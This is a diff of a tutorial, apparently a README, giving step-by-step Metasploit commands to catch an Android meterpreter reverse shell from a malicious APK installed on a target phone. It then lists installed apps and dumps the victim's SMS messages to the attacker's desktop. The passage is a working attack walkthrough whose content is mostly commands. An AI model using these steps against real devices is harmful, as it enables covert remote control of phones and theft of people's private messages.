@@ -50,20 +50,30 @@ After this, allow the permission to install the apk in the device. Enable all th
 
 Open Metasploit Framework in your Linux terminal. Type the command in your linux terminal to start Metasploit Framework.
 `msfconsole`
+
 Type this command to use the specific exploit:
 `use exploit/multi/handler`
+
 Set payload using this command:
 `set payload android/meterpreter/reverse_tcp`
+
 See Options:
 `show options`
+
 Set LHOST by the ip addr of the listener machine i.e. in our case, Kali Linux:
 `set LHOST 192.168.0.0` ➡ Replace 192.168.0.0 with your machine ip addr.
+
 After this, run it by using one of these commands:
 `exploit` or `run`
+
 As soon as yopu open the installed apk in the targeted device, it will create a meterpreter session in your terminal.
+
 Type `help` to see all the available options and commands that you can pass.
+
 `app_list` This will show us all the applications data already installed inside the device.
+
 Type command: `dump_sms` and hit enter.
+
 Then immediately you will see we have a file created on our desktop. Open it and ypu can see all of the text messages.
 
 
